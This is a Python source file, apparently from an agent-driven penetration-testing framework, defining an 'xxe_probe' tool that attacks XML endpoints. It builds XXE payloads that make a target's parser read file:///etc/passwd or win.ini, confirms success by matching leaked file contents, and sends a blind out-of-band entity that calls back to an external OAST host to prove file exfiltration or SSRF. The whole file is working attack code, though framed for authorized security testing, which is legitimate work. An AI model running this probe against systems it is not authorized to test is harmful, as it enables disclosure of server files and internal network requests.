"""XML External Entity (XXE) probing — file read, SSRF-via-XXE, and blind OOB.

No other tool covers XXE. This injects a DOCTYPE + external entity into an XML
request and confirms the parser resolved it by response CONTENT signatures
(``root:x:0:0`` from file:///etc/passwd, ``[fonts]`` from win.ini) — not mere
reflection — plus a blind out-of-band variant via OAST for parsers that don't
echo the entity. A baseline request and a payload-URL exclusion suppress false
positives, so a ``critical`` hit means the XML parser actually fetched the file.
"""

from __future__ import annotations

import asyncio
import json
from typing import Any

from agents import RunContextWrapper, function_tool

from strix.tools.http_replay.tools import _replay_impl


_INJECT_MARKER = "XXEINJECT"

# (label, system URL, (content signatures proving the parser resolved it, ...))
_FILE_TARGETS: tuple[tuple[str, str, tuple[str, ...]], ...] = (
    ("xxe-file-passwd", "file:///etc/passwd", ("root:x:0:0", "daemon:x:", "/bin/")),
    ("xxe-file-win-ini", "file:///c:/windows/win.ini", ("[fonts]", "[extensions]", "for 16-bit")),
)
_XML_DECL = '<?xml version="1.0" encoding="UTF-8"?>'


def _doc(system_url: str, template: str | None) -> str:
    """Build an XML doc whose ``&xxe;`` entity points at ``system_url``.

    With a ``template`` containing ``XXEINJECT``, insert the DOCTYPE after the
    XML declaration and put the entity where the marker is (so it lands in a
    field the app actually parses). Otherwise use a minimal self-contained doc.
    """
    doctype = f'<!DOCTYPE root [<!ENTITY xxe SYSTEM "{system_url}">]>'
    if template and _INJECT_MARKER in template:
        injected = template.replace(_INJECT_MARKER, "&xxe;")
        if injected.lstrip().startswith("<?xml"):
            decl, _, rest = injected.partition("?>")
            return f"{decl}?>{doctype}{rest}"
        return f"{_XML_DECL}{doctype}{injected}"
    return f"{_XML_DECL}{doctype}<root>&xxe;</root>"


def _sig_hit(body: str, base_body: str, system_url: str, sigs: tuple[str, ...]) -> str | None:
    """Signature in the payload response, absent from the baseline AND from the
    payload's system URL — genuine fetched content, not the echoed request."""
    for sig in sigs:
        if sig in body and sig not in base_body and sig not in system_url:
            return sig
    return None


def _xxe_probe_impl(
    url: str,
    method: str,
    xml_template: str | None,
    headers: dict[str, str] | None,
    content_type: str,
    oast_domain: str | None,
    timeout: int,
) -> dict[str, Any]:
    if not url or not url.strip():
        return {"success": False, "error": "url cannot be empty"}
    req_headers = {"Content-Type": content_type, **(headers or {})}

    # Baseline: the template with a benign entity value (no external fetch), so
    # signatures that are just reflected by the app don't count as findings.
    baseline_doc = _doc("urn:benign", xml_template)
    base = _replay_impl(method, url, req_headers, baseline_doc, timeout, allow_redirects=False)
    base_body = base.get("body") or "" if base.get("success") else ""

    findings: list[dict[str, Any]] = []
    for label, system_url, sigs in _FILE_TARGETS:
        doc = _doc(system_url, xml_template)
        resp = _replay_impl(method, url, req_headers, doc, timeout, allow_redirects=False)
        if not resp.get("success"):
            continue
        hit = _sig_hit(resp.get("body") or "", base_body, system_url, sigs)
        if hit:
            findings.append(
                {
                    "family": "xxe",
                    "target": label,
                    "system_url": system_url,
                    "severity": "critical",
                    "evidence": f"XML parser resolved {system_url}: response contains {hit!r}",
                }
            )

    if oast_domain:
        callback = f"http://{oast_domain}/xxe"
        _replay_impl(method, url, req_headers, _doc(callback, xml_template), timeout,
                     allow_redirects=False)
        findings.append(
            {
                "family": "xxe",
                "target": "blind-oob",
                "system_url": callback,
                "severity": "unconfirmed",
                "evidence": (
                    f"blind XXE entity sent — call oast_poll; a hit on {oast_domain}/xxe "
                    "confirms the parser resolved external entities (SSRF/file exfil)"
                ),
            }
        )

    confirmed = [f for f in findings if f["severity"] != "unconfirmed"]
    return {
        "success": True,
        "url": url,
        "finding_count": len(confirmed),
        "possible_xxe": bool(confirmed),
        "findings": findings,
    }


@function_tool(timeout=120, strict_mode=False)
async def xxe_probe(
    ctx: RunContextWrapper,
    url: str,
    method: str = "POST",
    xml_template: str | None = None,
    headers: dict[str, str] | None = None,
    content_type: str = "application/xml",
    oast_domain: str | None = None,
    timeout: int = 15,
) -> str:
    """Test an XML endpoint for XXE — file read, SSRF-via-XXE, and blind OOB.

    Injects a DOCTYPE + external entity and confirms the parser resolved it by
    response CONTENT signatures (``root:x:0:0`` from ``file:///etc/passwd``,
    ``[fonts]`` from win.ini) — a ``critical`` hit means the parser actually read
    the file, not that the app echoed the URL. With ``oast_domain`` it also sends
    a blind out-of-band entity to poll (catches parsers that don't return the
    entity). A baseline request + payload-URL exclusion suppress reflection false
    positives. Only test authorized targets.

    Point this at any endpoint that parses XML — SOAP, XML APIs, SAML, RSS/Atom
    ingestion, SVG/DOCX/XLSX upload handlers. Provide ``xml_template`` (the shape
    the endpoint expects) with an ``XXEINJECT`` marker where a value is echoed, so
    the entity lands in a parsed field; without one a minimal ``<root>&xxe;</root>``
    document is sent.

    Returns JSON with ``possible_xxe``, ``finding_count`` (confirmed only), and
    ``findings`` (target/system_url/severity/evidence). ``unconfirmed`` = confirm
    via ``oast_poll``.

    Args:
        url: The XML-parsing endpoint.
        method: HTTP method (default POST).
        xml_template: Optional XML body the endpoint expects, with an
            ``XXEINJECT`` marker placed where a value is reflected/parsed.
        headers: Request headers (send session headers if the endpoint is authed).
        content_type: Request Content-Type (default ``application/xml``; use
            ``text/xml`` or ``application/soap+xml`` to match the endpoint).
        oast_domain: An ``oast_get_domain`` host for the blind OOB entity.
        timeout: Per-request timeout in seconds (default 15).
    """
    del ctx
    return json.dumps(
        await asyncio.to_thread(
            _xxe_probe_impl,
            url,
            method,
            xml_template,
            headers,
            content_type,
            oast_domain,
            timeout,
        ),
        ensure_ascii=False,
        default=str,
    )
